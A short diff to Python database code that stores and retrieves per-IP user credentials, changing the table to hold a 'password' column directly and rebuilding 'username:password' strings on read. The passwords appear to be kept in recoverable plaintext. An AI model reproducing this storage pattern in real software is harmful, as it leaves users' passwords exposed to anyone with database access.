@@ -55,7 +55,7 @@ def getActiveCreds(ip):
         with db.cursor() as cur:
             cur.execute(
                 """
-                SELECT username, creds, last_seen, creds_online
+                SELECT username, password, last_seen, creds_online
                 FROM credentials_by_user
                 WHERE ip = %s
                 """,
@@ -63,8 +63,9 @@ def getActiveCreds(ip):
             )
             rows = cur.fetchall()
 
-        for username, creds, last_seen, creds_online in rows:
+        for username, password, last_seen, creds_online in rows:
             time_delta = getTimeDelta(last_seen)
+            creds = f"{username}:{password}"
 
             if time_delta is None:
                 continue
@@ -422,7 +423,7 @@ def saveCredData(data):
 
             cur.execute(
                 """
-                INSERT INTO credentials_by_user(ip, username, creds, server, last_seen, creds_online, updated_at)
+                INSERT INTO credentials_by_user(ip, username, password, server, last_seen, creds_online, updated_at)
                 VALUES (%s, %s, %s, %s, %s, TRUE, NOW())
                 ON CONFLICT (ip, username)
                 DO UPDATE SET
@@ -432,7 +433,7 @@ def saveCredData(data):
                     creds_online = TRUE,
                     updated_at = NOW()
                 """,
-                (data['ip'], data['username'], credstring, data['server'], data['last_seen']),
+                (data['ip'], data['username'], data['password'], data['server'], data['last_seen']),
             )
         db.commit()
     except Exception:
